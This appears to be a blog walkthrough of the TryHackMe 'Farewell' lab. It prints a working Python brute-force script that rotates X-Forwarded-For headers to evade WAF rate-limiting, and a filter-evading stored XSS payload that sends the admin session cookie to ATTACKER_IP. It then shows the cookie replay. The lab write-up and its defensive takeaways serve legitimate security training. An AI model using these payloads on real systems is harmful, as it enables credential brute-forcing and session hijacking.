---
title: "TryHackMe Farewell: WAF rate-limit bypass to XSS cookie theft"
date: 2026-11-04T22:17:00+05:30
lastmod: 2026-11-04T22:17:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-farewell/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Bypassing WAF
  - WAF bypass
  - rate-limit bypass
  - stored XSS
  - cookie theft
  - brute-force
  - X-Forwarded-For
  - ModSecurity
  - Web Application Red Teaming

draft: false
description: "TryHackMe Farewell walkthrough: bypass WAF rate-limiting with X-Forwarded-For to brute-force credentials, stored XSS with string concat to steal admin cookie."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Farewell |![Farewell room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1762953208527)|

This medium-difficulty room is the final challenge in the Bypassing WAF module of the Web Application Red Teaming path. It combines two WAF bypass techniques into one attack chain: rate-limit evasion for brute-forcing a user password, and string concatenation to bypass keyword filters for a stored XSS cookie steal. The room follows [Padelify](/post/thm-room-padelify/) in the module.

## Task 1: Farewell

The room deploys a single VM running a PHP farewell message board behind ModSecurity. Two flags are hidden behind two roles: a normal user and admin. A WAF enforces User-Agent filtering and request rate-limiting, so both require a bypass.

### Reconnaissance

Start with a port scan:

```
nmap -sC -sV 10.81.135.84
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58
```

The web app at port 80 is a farewell message dashboard with a login form. A scrolling ticker at the top reveals three active users: `adam`, `deliver11`, and `nora`. The room description says the server will be decommissioned in 24 hours, and the admin panel holds all submitted messages.

One critical detail from nmap: the `httponly` flag is not set on the server's `PHPSESSID` cookie. This means JavaScript can read the cookie, which becomes important for the XSS phase.

### User enumeration and password hints

The login form posts to `/auth.php`. Testing with wrong passwords reveals two distinct behaviors: for valid usernames, the response includes the user object with a `password_hint` field; for invalid ones, a bare `auth_failed` error.

Using this oracle, all three ticker users plus `admin` are confirmed valid. Their hints:

| User | Password hint |
|---|---|
| admin | the year plus a kind send-off |
| adam | favorite pet + 2 |
| deliver11 | Capital of Japan followed by 4 digits |
| nora | lucky number 789 |

The `deliver11` hint is the most deterministic: `Tokyo` followed by a 4-digit number, giving exactly 10,000 candidates. The others require unknown context (the specific pet, the specific year and farewell word).

### Step 1: brute-force deliver11 through the WAF

Attempting to brute-force directly fails because the WAF blocks requests with non-browser User-Agent strings (the same filter from Padelify). Adding a real browser User-Agent header fixes this, but after a few successful requests the WAF starts rate-limiting with 403 responses.

The bypass: the `X-Forwarded-For` header. ModSecurity tracks request rates per source IP, but if it trusts the `X-Forwarded-For` header, sending a random IP with each request resets the rate counter.

```python
import requests
import random
import concurrent.futures

URL = "http://10.81.135.84/auth.php"
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

def worker(digits):
    xfwd = ".".join(str(random.randint(1, 254)) for _ in range(4))
    pwd = f"Tokyo{digits:04d}"
    r = requests.post(URL, data={"username": "deliver11", "password": pwd},
                      headers={"X-Forwarded-For": xfwd, "User-Agent": UA}, timeout=10)
    if "auth_failed" not in r.text and r.status_code == 200:
        return pwd
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(worker, d): d for d in range(10000)}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[+] FOUND: {result}")
            break
```

```
[+] FOUND: Tokyo1010
```

Log in as `deliver11` with the discovered password. The dashboard shows a farewell message form and the user flag.

**User flag: THM{USER_ACCESS_1010}**

{{< ad >}}

### Step 2: stored XSS with string concatenation to steal admin cookie

The dashboard has a message submission form. Submitted messages appear with "Pending Review" status, meaning an admin bot periodically reviews them. This is a stored XSS scenario: any HTML/JS injected into the message body executes in the admin's authenticated session when the bot renders it.

Testing with `<img src="http://ATTACKER_IP:8888/test.jpg">` confirms the XSS fires: the HTTP listener receives a request from the target server for the image.

Since `httponly` is not set on the session cookie, the goal is to exfiltrate the admin's `PHPSESSID` via JavaScript. However, the WAF blocks the keywords `fetch` and `cookie` in POST parameters. Additionally, the combination `<img onerror` (lowercase) triggers a separate WAF rule.

Three bypasses stacked together:

1. **Uppercase tag**: `<IMG` instead of `<img` avoids the `<img onerror` combo rule
2. **`eval()` wrapper**: wraps the payload in `eval()` so string operations can reconstruct blocked keywords at runtime
3. **String concatenation**: `"fet"+"ch"` and `"coo"+"kie"` split the blocked keywords across string boundaries

The final payload:

```
<IMG src=x onerror=eval("fet"+"ch('http://ATTACKER_IP:8888/?c='+document.coo"+"kie)")>
```

Start an HTTP listener, submit the payload via the dashboard form, and wait for the admin bot:

```
python3 -m http.server 8888
```

```
10.81.135.84 - - "GET /?c=PHPSESSID=tn874hsnhlajfo5fde719t456o HTTP/1.1" 200 -
```

Use the stolen admin cookie to access `/admin.php`. The admin panel shows all submitted farewell messages and the admin flag.

```
curl -s -H "User-Agent: Mozilla/5.0 ..." \
  -H "Cookie: PHPSESSID=tn874hsnhlajfo5fde719t456o" \
  http://10.81.135.84/admin.php
```

**Admin flag: THM{ADMINP@wned007}**

## Takeaways

1. **Rate-limiting based on client-supplied headers is trivially bypassable.** When the WAF trusts `X-Forwarded-For` for rate tracking without a trusted proxy chain, an attacker can rotate the header value per request and brute-force indefinitely. Rate-limiting must key on the actual TCP source IP, not a forwardable header.

2. **WAF keyword filters fail against runtime string construction.** The WAF caught `fetch` and `cookie` as literal strings in the POST body, but `eval("fet"+"ch")` reconstructs the same function call at execution time. The filter operates on the static request text while the browser operates on the dynamic result of string concatenation, and these two views never align.

Room solved 100%: 1 task, 2 answers.
